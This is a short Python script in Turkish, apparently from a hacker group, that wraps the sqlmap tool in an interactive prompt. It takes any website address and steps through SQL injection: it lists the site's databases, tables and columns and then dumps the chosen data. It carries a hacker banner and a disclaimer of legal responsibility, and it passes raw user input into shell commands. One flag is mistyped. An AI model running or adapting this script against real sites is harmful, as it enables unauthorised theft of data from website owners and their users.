#DarKH4cKR-aTo YARI OTOMATİK SQLMap PROJESİ
import os



print("\x1b[01;31m*"*55)
print("\x1b[01;31m*"*9,"-"*7,"*"*37)
print("\x1b[01;31m*"*7,"-"*7,"*"*18,"-","*"*18)
print("\x1b[01;31m*"*5,"-"*7,"*"*19,"---","*"*17)
print("\x1b[01;31m*"*4,"-"*7,"*"*16,"-"*11,"*"*13)
print("\x1b[01;31m*"*3,"-"*7,"*"*19,"-"*7,"*"*15)
print("\x1b[01;31m*"*4,"-"*7,"*"*17,"-"*3,"*","-"*3,"*"*14)
print("\x1b[01;31m*"*5,"-"*7,"*"*15,"-","*"*7,"-","*"*13)
print("\x1b[01;31m*"*7,"-"*7,"*"*39)
print("\x1b[01;31m*"*9,"-"*7,"*"*37)
print("\x1b[01;31m*"*55)

print("""\x1b[01;31m
      

      
==================
DarKH4cKR-aTo YARI OTOMATİK SQLMap PROJESİ
Cyber Warrior'ın Katkılarıyla.
Kodlayıcı Hiç Bir Yasal Sorumluluk Kabul Etmez...
===================
""")

print("\x1b[01;32m Yapıcağınız İşlemlerden Kodlayıcı Sorumlu Tutulmaz...")

site = input("Başında http(s):// olmadan Site Adresini Giriniz:")
sqlmap1 = os.system("sqlmap --url  {} --dbs  ==randon-agent".format (site))
data = input('DataBase Adını Yazınız(Çıkmak İçin q ya Basınız): ')
if data == "q":
        print('[q] tuşuna bastığıniz için program sonlandırıldı.')
        quit() 
sqlmap2 = os.system('sqlmap --url  {} -D {} --tables  ==randon-agent'.format (site,data))
tablo = input('Çekmek İstediğiniz Tablo Adını Yazınız(Çıkmak İçin q ya Basınız) : ')
if tablo == "q":
        print('[q] tuşuna bastığıniz için program sonlandırıldı.')
        quit() 
sqlmap3 = os.system('sqlmap --url  {} -D {} -T {} --columns  ==randon-agent'.format (site,data,tablo))
clm =input('Dump Etmek İstediğiniz Veriyi Yazınız(Çıkmak İçin q ya Basınız) : ')
if clm == "q":
        print('[q] tuşuna bastığıniz için program sonlandırıldı.')
        quit() 
sqlmap4 = os.system('sqlmap --url  {} -D {} -T {} -C {} --dump  ==randon-agent'.format (site,data,tablo,clm))
